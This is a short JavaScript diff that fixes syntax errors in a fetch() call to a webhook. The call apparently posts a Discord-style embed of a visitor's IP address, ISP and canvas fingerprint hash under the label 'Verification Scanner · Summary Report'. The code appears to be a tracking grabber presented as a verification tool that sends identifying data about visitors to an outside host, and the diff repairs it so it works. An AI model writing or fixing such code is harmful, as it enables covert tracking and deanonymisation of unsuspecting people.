@@ -191,13 +191,13 @@ await fetch(WEBHOOK_URL, {
         // —— NETWORK ——
         { name: "IP Address", value: `${network.ip || "Unknown"}`, inline: false },
         { name: "ISP / Org", value: `${network.org || "Unknown"}`, inline: false },
-        { name: "Lookup Status", value: `${network.lookupStatus || "Unknown", inline: false },
+        { name: "Lookup Status", value: `${network.lookupStatus || "Unknown"}`, inline: false },
 
         // —— CANVAS ——
         { name: "Canvas Hash", value: `${canvasFP || "Unknown"}`, inline: false },
 
         // —— NOTES ——
-        { name: "Environment Notes", `${value: "None", inline: false }
+        { name: "Environment Notes", value: "None", inline: false }
       ],
       footer: {
         text: "Verification Scanner · Summary Report"
